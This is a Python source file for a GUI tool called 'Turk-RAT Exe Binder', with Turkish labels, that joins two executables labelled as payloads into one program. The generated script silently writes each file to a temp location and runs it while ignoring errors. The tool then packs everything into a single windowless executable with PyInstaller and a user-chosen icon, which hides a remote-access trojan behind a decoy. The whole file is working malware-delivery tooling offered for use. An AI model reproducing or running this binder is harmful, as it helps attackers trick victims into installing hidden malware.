#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turk-RAT Exe Binder - Cross Platform (Linux + Windows + macOS)
Author: Kiokhan (meterplord)
"""

import os
import sys
import subprocess
import shutil
import tempfile
from PIL import Image
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QFileDialog, QMessageBox, QFrame
)
from PySide6.QtGui import QFont, QColor, QPalette
from PySide6.QtCore import Qt, QSize


class ExeBinder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Turk-RAT Exe Binder - Cross Platform")
        self.file1_path = ""
        self.file2_path = ""
        self.icon_path = ""
        self.setup_ui()
        self.apply_theme()

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)

        # Başlık
        header = QLabel("TURK-RAT EXE BINDER")
        header.setFont(QFont("Consolas", 20, QFont.Bold))
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("color: #FF0000; margin: 10px;")
        main_layout.addWidget(header)

        # Kutu
        box = QFrame()
        box.setFrameShape(QFrame.StyledPanel)
        box_layout = QVBoxLayout(box)

        self.file1_edit = self.create_selector(box_layout, "1. Dosya Seç (EXE/Payload):", self.browse_file1)
        self.file2_edit = self.create_selector(box_layout, "2. Dosya Seç (EXE/Payload):", self.browse_file2)
        self.icon_edit = self.create_selector(box_layout, "İkon Seç (.png önerilir):", self.browse_icon, "İkon")

        # Bind butonu
        self.bind_btn = QPushButton("DOSYALARI BİRLEŞTİR")
        self.bind_btn.setFont(QFont("Consolas", 14, QFont.Bold))
        self.bind_btn.setMinimumHeight(60)
        self.bind_btn.clicked.connect(self.bind_files)
        self.bind_btn.setStyleSheet("""
            QPushButton {
                background-color: #008000; color: white; border: 2px solid white; border-radius: 8px;
            }
            QPushButton:hover { background-color: #00CC00; }
        """)
        box_layout.addWidget(self.bind_btn)

        main_layout.addWidget(box)
        self.setFixedSize(680, 520)

    def create_selector(self, layout, text, func, btn_text="Gözat"):
        layout.addWidget(QLabel(text))
        hbox = QHBoxLayout()
        edit = QLineEdit()
        edit.setReadOnly(True)
        edit.setPlaceholderText("Dosya seçilmedi...")
        btn = QPushButton(btn_text)
        btn.clicked.connect(func)
        btn.setStyleSheet("background-color: #990000; color: white; padding: 8px;")
        hbox.addWidget(edit)
        hbox.addWidget(btn)
        layout.addLayout(hbox)
        return edit

    def apply_theme(self):
        self.setStyleSheet("""
        QMainWindow, QWidget { background-color: #000000; color: white; }
        QFrame { background-color: #0a0a0a; border: 1px solid #333; border-radius: 10px; padding: 10px; }
        QLabel { color: #FFFFFF; font-size: 11pt; }
        QLineEdit { background-color: #111111; border: 1px solid #444; padding: 8px; border-radius: 5px; color: white; }
        """)

    def browse_file1(self):
        path, _ = QFileDialog.getOpenFileName(self, "1. Dosya Seç", "", "All Files (*);;Executables (*.exe *.bin)")
        if path:
            self.file1_path = path
            self.file1_edit.setText(os.path.basename(path))

    def browse_file2(self):
        path, _ = QFileDialog.getOpenFileName(self, "2. Dosya Seç", "", "All Files (*);;Executables (*.exe *.bin)")
        if path:
            self.file2_path = path
            self.file2_edit.setText(os.path.basename(path))

    def browse_icon(self):
        path, _ = QFileDialog.getOpenFileName(self, "İkon Seç", "", "Images (*.png *.jpg *.jpeg *.ico)")
        if path:
            self.icon_path = path
            self.icon_edit.setText(os.path.basename(path))

    def bind_files(self):
        if not self.file1_path or not self.file2_path:
            QMessageBox.critical(self, "Hata", "Lütfen iki dosyayı da seçin!")
            return

        # İkon kontrolü (PNG/JPG kabul eder)
        icon_arg = []
        if self.icon_path:
            if not self.icon_path.lower().endswith(('.png', '.jpg', '.jpeg', '.ico')):
                QMessageBox.warning(self, "Uyarı", "İkon PNG/JPG/ICO olmalı!")
                return
            icon_arg = ["--icon", self.icon_path]

        reply = QMessageBox.question(self, "Onay", "Birleştirme başlasın mı?")
        if reply != QMessageBox.Yes:
            return

        self.bind_btn.setEnabled(False)
        self.bind_btn.setText("Birleştiriliyor... Lütfen bekleyin")
        QApplication.processEvents()

        try:
            self.create_binder()
            QMessageBox.information(self, "Başarılı!",
                                    "EXE başarıyla oluşturuldu!\n\n"
                                    "Çıktı: binder_output/dist/binder.exe")
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"Birleştirme başarısız:\n{str(e)}")
        finally:
            self.bind_btn.setEnabled(True)
            self.bind_btn.setText("DOSYALARI BİRLEŞTİR")

    def create_binder(self):
        output_dir = "binder_output"
        shutil.rmtree(output_dir, ignore_errors=True)
        os.makedirs(output_dir, exist_ok=True)

        # Dosyaları oku
        with open(self.file1_path, "rb") as f:
            data1 = f.read()
        with open(self.file2_path, "rb") as f:
            data2 = f.read()

        name1 = os.path.basename(self.file1_path)
        name2 = os.path.basename(self.file2_path)

        script = f'''
import os
import subprocess
import tempfile
import sys

def run_payload(data, name):
    try:
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix="_" + name)
        tmp.write(data)
        tmp.close()
        if sys.platform.startswith("win"):
            subprocess.Popen(tmp.name, shell=False)
        else:
            os.chmod(tmp.name, 0o755)
            subprocess.Popen(tmp.name, shell=False)
    except:
        pass

payload1 = {repr(data1)}
payload2 = {repr(data2)}

if __name__ == "__main__":
    run_payload(payload1, "{name1}")
    run_payload(payload2, "{name2}")
'''

        script_path = os.path.join(output_dir, "binder.py")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script)

        # PyInstaller komutu
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--distpath", os.path.join(output_dir, "dist"),
            "--workpath", os.path.join(output_dir, "build"),
            "--specpath", output_dir,
        ]
        if self.icon_path:
            cmd += ["--icon", self.icon_path]
        cmd += [script_path]

        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            raise Exception(f"PyInstaller hatası:\n{result.stderr}")

        # Temizlik
        for item in ["build", "__pycache__", "binder.spec"]:
            path = os.path.join(output_dir, item)
            if os.path.exists(path):
                shutil.rmtree(path, ignore_errors=True)
        if os.path.exists(script_path):
            os.remove(script_path)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ExeBinder()
    window.show()
    sys.exit(app.exec())
